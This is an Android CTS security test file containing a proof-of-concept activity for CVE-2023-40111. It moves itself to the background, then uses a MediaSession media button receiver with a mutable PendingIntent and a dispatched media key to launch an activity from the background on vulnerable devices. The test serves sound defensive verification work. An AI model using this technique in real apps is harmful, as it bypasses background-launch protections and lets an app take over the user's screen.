/*
 * Copyright (C) 2023 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_40111;

import static android.provider.Settings.ACTION_SETTINGS;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.media.AudioManager;
import android.media.AudioPlaybackConfiguration;
import android.media.MediaPlayer;
import android.media.session.MediaSession;
import android.os.Handler;
import android.os.Looper;
import android.view.KeyEvent;

import java.util.List;

public class PocActivity extends Activity {
    private AudioManager mAudioManager;

    @Override
    protected void onResume() {
        try {
            super.onResume();
            mAudioManager = getSystemService(AudioManager.class);

            // To move task in background according to task issue.
            moveTaskToBack(true);
            PendingIntent pendingIntent =
                    PendingIntent.getActivity(
                            this,
                            1 /* requestCode */,
                            new Intent(this, TargetActivity.class),
                            PendingIntent.FLAG_MUTABLE);

            // Using handler() to update the thread from the background thread to the main thread
            // using looper to be run after the specified amount of time elapses.
            Handler handler = new Handler(Looper.getMainLooper());
            Runnable runnable =
                    () -> {
                        if (!isAppOnForeground()) {
                            MediaSession mediaSession =
                                    new MediaSession(PocActivity.this, "TEST_SESSION_TAG");

                            // Checks successful media playback initiation
                            runMediaPlayback(handler);

                            // On vulnerable device, calling setMediaButtonReceiver() causes
                            // TargetActivity to be launched.
                            mediaSession.setMediaButtonReceiver(pendingIntent);
                            mediaSession.release();
                            mAudioManager.dispatchMediaKeyEvent(
                                    new KeyEvent(
                                            KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_MEDIA_PLAY));
                        }
                    };
            handler.postDelayed(runnable, 2_000L /* delay */);

            // Launching settings to reproduce vulnerability
            startActivity(new Intent(ACTION_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            sendBroadcast(
                    new Intent(getString(R.string.bcastAction))
                            .putExtra(
                                    getString(R.string.pocActivityStatus),
                                    getString(R.string.noExceptionMsg)));
        } catch (Exception e) {
            try {
                sendBroadcast(
                        new Intent(getString(R.string.bcastAction))
                                .putExtra(getString(R.string.pocActivityStatus), e.getMessage()));
            } catch (Exception ignored) {
                // Ignore any exceptions
            }
        }
    }

    private boolean isAppOnForeground() {
        ActivityManager activityManager = getSystemService(ActivityManager.class);
        List<ActivityManager.RunningAppProcessInfo> appProcesses =
                activityManager.getRunningAppProcesses();
        if (appProcesses == null) {
            return false;
        }
        for (ActivityManager.RunningAppProcessInfo appProcess : appProcesses) {
            if (appProcess.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
                    && appProcess.processName.equals(getPackageName())) {
                return true;
            }
        }
        return false;
    }

    private void runMediaPlayback(Handler handler) {
        AudioManager.AudioPlaybackCallback callback =
                new AudioManager.AudioPlaybackCallback() {
                    @Override
                    public void onPlaybackConfigChanged(List<AudioPlaybackConfiguration> configs) {}
                };

        MediaPlayer mediaPlayer = null;
        try {
            mAudioManager.registerAudioPlaybackCallback(callback, handler);

            // Used from cts/tests/tests/media/common/src/android/media/cts/Utils.java
            mediaPlayer = MediaPlayer.create(this, R.raw.sine1khzs40dblong);
            mediaPlayer.start();
        } finally {
            mAudioManager.unregisterAudioPlaybackCallback(callback);
            if (mediaPlayer != null) {
                mediaPlayer.stop();
                mediaPlayer.release();
            }
        }
    }
}
